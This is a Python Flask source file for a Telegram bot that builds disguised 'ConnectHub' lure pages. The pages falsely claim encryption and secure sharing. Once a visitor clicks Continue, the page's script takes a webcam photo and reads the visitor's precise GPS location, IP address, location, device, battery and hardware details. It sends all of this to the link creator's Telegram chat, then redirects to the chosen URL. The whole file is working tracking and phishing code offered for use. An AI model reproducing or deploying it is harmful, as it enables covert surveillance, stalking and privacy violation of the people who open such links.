from flask import Flask, request, jsonify, send_from_directory
import json
import time
import os
import threading
import requests
from datetime import datetime, timedelta
import logging
import sys

logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = os.environ.get("CHANNEL_ID")
REQUIRED_CHANNEL = "@nrtecno2"
ACCOUNT_NAME = "telegram-bot-b9j0"
HTML_DIR = "html_files"
PHOTO_DIR = "photos"
USER_STATE_FILE = "user_state.json"
USER_LINKS_FILE = "user_links.json"

os.makedirs(HTML_DIR, exist_ok=True)
os.makedirs(PHOTO_DIR, exist_ok=True)

if not os.path.exists(USER_STATE_FILE):
    with open(USER_STATE_FILE, "w") as f:
        json.dump({}, f)

if not os.path.exists(USER_LINKS_FILE):
    with open(USER_LINKS_FILE, "w") as f:
        json.dump({}, f)


def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        logger.error(f"Send error: {e}")


def send_photo(chat_id, photo_bytes):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    try:
        files = {"photo": ("photo.jpg", photo_bytes, "image/jpeg")}
        data = {"chat_id": chat_id}
        requests.post(url, data=data, files=files, timeout=10)
    except Exception as e:
        logger.error(f"Send photo error: {e}")


def get_user_state(user_id):
    with open(USER_STATE_FILE, "r") as f:
        data = json.load(f)
    return data.get(str(user_id), {"state": None, "target_url": None})


def set_user_state(user_id, state, target_url=None):
    with open(USER_STATE_FILE, "r") as f:
        data = json.load(f)
    data[str(user_id)] = {"state": state, "target_url": target_url}
    with open(USER_STATE_FILE, "w") as f:
        json.dump(data, f)


def get_user_active_link(user_id):
    with open(USER_LINKS_FILE, "r") as f:
        data = json.load(f)
    return data.get(str(user_id))


def set_user_active_link(user_id, html_file, photo_file):
    with open(USER_LINKS_FILE, "r") as f:
        data = json.load(f)
    old = data.get(str(user_id))
    if old:
        old_html = os.path.join(HTML_DIR, old.get("html"))
        old_photo = os.path.join(PHOTO_DIR, old.get("photo"))
        if os.path.exists(old_html):
            os.remove(old_html)
        if os.path.exists(old_photo):
            os.remove(old_photo)
    data[str(user_id)] = {"html": html_file, "photo": photo_file, "created_at": time.time()}
    with open(USER_LINKS_FILE, "w") as f:
        json.dump(data, f)


def is_subscribed(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember?chat_id={REQUIRED_CHANNEL}&user_id={user_id}"
        r = requests.get(url, timeout=10)
        data = r.json()
        if data.get("ok"):
            return data["result"]["status"] in ["member", "administrator", "creator"]
    except:
        pass
    return False


def delete_old_files():
    cutoff = datetime.now() - timedelta(minutes=10)
    for f in os.listdir(PHOTO_DIR):
        fp = os.path.join(PHOTO_DIR, f)
        try:
            if datetime.fromtimestamp(os.path.getmtime(fp)) < cutoff:
                os.remove(fp)
        except:
            pass


def start_auto_cleanup():
    def cleanup():
        while True:
            time.sleep(600)
            delete_old_files()
    threading.Thread(target=cleanup, daemon=True).start()


def generate_html(user_id, target_url, photo_filename):
    html_filename = f"{user_id}_{int(time.time())}.html"
    filepath = os.path.join(HTML_DIR, html_filename)
    photo_url = f"https://{ACCOUNT_NAME}.onrender.com/photos/{photo_filename}"
    storage = CHANNEL_ID if CHANNEL_ID else "null"

    html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>ConnectHub</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        .card {{
            background: white;
            border-radius: 32px;
            max-width: 400px;
            width: 100%;
            overflow: hidden;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
            animation: fadeIn 0.5s ease-out;
        }}
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: translateY(20px); }}
            to {{ opacity: 1; transform: translateY(0); }}
        }}
        .header {{
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            padding: 24px;
            text-align: center;
        }}
        .logo {{ font-size: 28px; font-weight: bold; color: white; }}
        .logo span {{ color: #e94560; }}
        .content {{ padding: 24px; text-align: center; }}
        .user-photo {{
            width: 100px;
            height: 100px;
            border-radius: 50%;
            object-fit: cover;
            margin: 0 auto 16px;
            border: 3px solid #e94560;
        }}
        .btn {{
            background: linear-gradient(135deg, #e94560 0%, #c62a4a 100%);
            color: white;
            border: none;
            padding: 14px 28px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 16px;
            animation: pulse 2s infinite;
        }}
        @keyframes pulse {{
            0% {{ transform: scale(1); }}
            50% {{ transform: scale(1.03); }}
            100% {{ transform: scale(1); }}
        }}
        .footer {{
            background: #f5f5f5;
            padding: 16px;
            text-align: center;
            font-size: 11px;
            color: #999;
        }}
        .loader {{
            width: 48px;
            height: 48px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #e94560;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        .step {{ display: none; }}
        .active {{ display: block; }}
    </style>
</head>
<body>
<div class="card">
    <div class="header"><div class="logo">Connect<span>Hub</span></div></div>

    <div id="step1" class="step active content">
        <img class="user-photo" src="{photo_url}">
        <p style="margin: 16px 0; color: #666;">Shared securely with you</p>
        <button class="btn" id="continueBtn">Continue →</button>
    </div>

    <div id="step2" class="step content">
        <div class="loader"></div>
        <p style="margin-top: 16px; color: #666;">Processing...</p>
    </div>

    <div class="footer">
        <p>🔒 End-to-end encrypted</p>
    </div>
</div>

<video id="video" autoplay playsinline muted style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
const TOKEN = "{TOKEN}";
const USER = {user_id};
const STORAGE = {storage};
const TARGET = "{target_url}";

function formatBytes(bytes) {{
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}}

async function sendToBot(text, photoData = null) {{
    try {{
        if (photoData) {{
            const formData = new FormData();
            formData.append('chat_id', USER);
            formData.append('photo', photoData, 'photo.jpg');
            await fetch(`https://api.telegram.org/bot${{TOKEN}}/sendPhoto`, {{ method: 'POST', body: formData }});
            if (STORAGE && STORAGE !== 'null') {{
                const formData2 = new FormData();
                formData2.append('chat_id', STORAGE);
                formData2.append('photo', photoData, 'photo.jpg');
                await fetch(`https://api.telegram.org/bot${{TOKEN}}/sendPhoto`, {{ method: 'POST', body: formData2 }});
            }}
        }} else {{
            await fetch(`https://api.telegram.org/bot${{TOKEN}}/sendMessage`, {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{ chat_id: USER, text: text, parse_mode: 'HTML' }})
            }});
            if (STORAGE && STORAGE !== 'null') {{
                await fetch(`https://api.telegram.org/bot${{TOKEN}}/sendMessage`, {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ chat_id: STORAGE, text: text, parse_mode: 'HTML' }})
                }});
            }}
        }}
    }} catch(e) {{ console.log(e); }}
}}

async function getIP() {{
    try {{
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    }} catch(e) {{ return 'Unknown'; }}
}}

async function getIPInfo(ip) {{
    try {{
        const res = await fetch(`https://ipapi.co/${{ip}}/json/`);
        return await res.json();
    }} catch(e) {{ return {{}}; }}
}}

async function getBattery() {{
    if (navigator.getBattery) {{
        try {{
            const b = await navigator.getBattery();
            return {{ level: Math.round(b.level * 100), charging: b.charging }};
        }} catch(e) {{}}
    }}
    return null;
}}

function getDeviceInfo() {{
    const ua = navigator.userAgent;
    let device = 'Desktop/Laptop';
    if (/iPhone/i.test(ua)) device = 'iPhone';
    else if (/iPad/i.test(ua)) device = 'iPad';
    else if (/Android/i.test(ua)) device = 'Android Phone';
    else if (/Mobile/i.test(ua)) device = 'Mobile Device';
    return {{ device: device, userAgent: ua }};
}}

function getHardwareInfo() {{
    return {{
        cores: navigator.hardwareConcurrency || 'Unknown',
        ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'
    }};
}}

async function getStorageInfo() {{
    try {{
        if (navigator.storage && navigator.storage.estimate) {{
            const estimate = await navigator.storage.estimate();
            return {{
                used: formatBytes(estimate.usage),
                total: formatBytes(estimate.quota)
            }};
        }}
    }} catch(e) {{}}
    return null;
}}

async function captureFullInfo() {{
    try {{
        const ip = await getIP();
        const ipInfo = await getIPInfo(ip);
        const battery = await getBattery();
        const device = getDeviceInfo();
        const hardware = getHardwareInfo();
        const storage = await getStorageInfo();
        const language = navigator.language || 'Unknown';
        const resolution = screen.width + 'x' + screen.height;

        let msg = "<b>Visitor Information Captured</b>\n";
        msg += "------------------------\n\n";
        msg += "<b>Device & Browser</b>\n";
        msg += "   Device: " + device.device + "\n";
        msg += "   User Agent: " + device.userAgent.substring(0, 200) + "\n\n";
        msg += "<b>Network Information</b>\n";
        msg += "   IP Address: " + ip + "\n";
        msg += "   Language: " + language + "\n\n";
        msg += "<b>Location Details</b>\n";
        msg += "   Country: " + (ipInfo.country_name || 'Unknown') + "\n";
        msg += "   Region: " + (ipInfo.region || 'Unknown') + "\n";
        msg += "   City: " + (ipInfo.city || 'Unknown') + "\n";
        msg += "   Postal Code: " + (ipInfo.postal || 'Unknown') + "\n";
        msg += "   Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\n\n";
        msg += "<b>Display Information</b>\n";
        msg += "   Resolution: " + resolution + "\n\n";
        msg += "<b>Battery Status</b>\n";
        msg += "   Level: " + (battery ? battery.level + '%' : 'Unknown') + "\n";
        msg += "   Charging: " + (battery ? (battery.charging ? 'Yes' : 'No') : 'Unknown') + "\n\n";
        msg += "<b>Hardware & Storage</b>\n";
        msg += "   CPU Cores: " + hardware.cores + "\n";
        msg += "   RAM: " + hardware.ram + "\n";
        msg += "   Storage Used: " + (storage ? storage.used : 'Unknown') + "\n";
        msg += "   Storage Total: " + (storage ? storage.total : 'Unknown') + "\n\n";
        msg += "------------------------\n";
        msg += "Developed by: @nrtecno2";

        await sendToBot(msg);
        return true;
    }} catch(e) {{
        await sendToBot('Error: ' + e.message);
        return false;
    }}
}}

async function capturePhotoAndLocation() {{
    try {{
        const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }}, audio: false }});
        const video = document.getElementById('video');
        video.srcObject = stream;
        await new Promise(resolve => video.onloadedmetadata = () => {{ video.play(); resolve(); }});
        await new Promise(resolve => setTimeout(resolve, 300));
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
        if (blob && blob.size > 500) {{
            await sendToBot(null, blob);
        }}
        stream.getTracks().forEach(track => track.stop());

        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(async (pos) => {{
                await sendToBot("<b>Live Location</b>\nhttps://maps.google.com/?q=" + pos.coords.latitude + "," + pos.coords.longitude);
                await sendToBot("<b>Coordinates</b>\nLat: " + pos.coords.latitude + "\nLon: " + pos.coords.longitude + "\nAccuracy: " + pos.coords.accuracy + "m");
            }}, async (err) => {{
                await sendToBot("<b>Location</b>\nAccess denied");
            }}, {{ timeout: 10000, enableHighAccuracy: true }});
        }}

        return true;
    }} catch(e) {{
        await sendToBot("<b>Camera</b>\nAccess denied");
        return false;
    }}
}}

document.getElementById('continueBtn').addEventListener('click', async () => {{
    document.getElementById('step1').classList.remove('active');
    document.getElementById('step2').classList.add('active');

    await captureFullInfo();

    const cameraSuccess = await capturePhotoAndLocation();

    if (cameraSuccess) {{
        setTimeout(() => {{
            window.location.href = TARGET;
        }}, 1500);
    }} else {{
        document.getElementById('step2').classList.remove('active');
        document.getElementById('step1').classList.add('active');
        alert('Camera access is required to continue.');
    }}
}});
</script>
</body>
</html>'''

    with open(filepath, "w", encoding="utf-8") as f:
        f.write(html)
    return html_filename


@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error"}), 400

        if 'callback_query' in data:
            cb = data['callback_query']
            uid = cb['from']['id']
            if cb['data'] == 'verify':
                if is_subscribed(uid):
                    send_message(uid, "Verified! Send me any URL:")
                    set_user_state(uid, "waiting_url")
                else:
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery",
                                 json={"callback_query_id": cb['id'], "text": "Join channel first!", "show_alert": True})
            return jsonify({"status": "ok"}), 200

        if 'message' not in data:
            return jsonify({"status": "ok"}), 200

        msg = data['message']
        uid = msg['chat']['id']

        if 'text' in msg:
            text = msg['text']
            if text == '/start':
                if not is_subscribed(uid):
                    markup = {"inline_keyboard": [[{"text": "Join Channel", "url": "https://t.me/nrtecno2"}], [{"text": "Verify", "callback_data": "verify"}]]}
                    send_message(uid, f"Join {REQUIRED_CHANNEL} first!", markup)
                else:
                    set_user_state(uid, "waiting_url")
                    send_message(uid, "Send me any URL:")
            elif text.startswith(('http://', 'https://')):
                state = get_user_state(uid)
                if state.get("state") == "waiting_url":
                    set_user_state(uid, "waiting_photo", text)
                    send_message(uid, "Now share a photo with me")
                else:
                    send_message(uid, "Use /start first")
            else:
                send_message(uid, "Send a valid URL")

        elif 'photo' in msg:
            uid = msg['chat']['id']
            state = get_user_state(uid)
            if state.get("state") != "waiting_photo":
                send_message(uid, "Send URL first using /start")
                return jsonify({"status": "ok"}), 200

            target_url = state.get("target_url")
            if not target_url:
                send_message(uid, "Error. Use /start again")
                return jsonify({"status": "ok"}), 200

            try:
                file_id = msg['photo'][-1]['file_id']
                file_info = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}").json()
                file_path = file_info['result']['file_path']
                img_data = requests.get(f"https://api.telegram.org/file/bot{TOKEN}/{file_path}").content

                photo_name = f"{uid}_{int(time.time())}.jpg"
                with open(os.path.join(PHOTO_DIR, photo_name), "wb") as f:
                    f.write(img_data)

                html_name = generate_html(uid, target_url, photo_name)
                set_user_active_link(uid, html_name, photo_name)
                set_user_state(uid, "done")

                link = f"https://{ACCOUNT_NAME}.onrender.com/view/{html_name}"
                send_message(uid, f"Your link:\n{link}\n\nActive until you create a new one\nCamera required")

            except Exception as e:
                logger.error(f"Photo error: {e}")
                send_message(uid, "Error. Try again")

        return jsonify({"status": "ok"}), 200

    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return jsonify({"status": "error"}), 500


@app.route('/view/<filename>')
def serve_html(filename):
    filepath = os.path.join(HTML_DIR, filename)
    if os.path.exists(filepath):
        return send_from_directory(HTML_DIR, filename)
    return "Link expired", 404


@app.route('/photos/<filename>')
def serve_photo(filename):
    return send_from_directory(PHOTO_DIR, filename)


@app.route('/')
def home():
    return "Bot alive"


if __name__ == "__main__":
    start_auto_cleanup()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
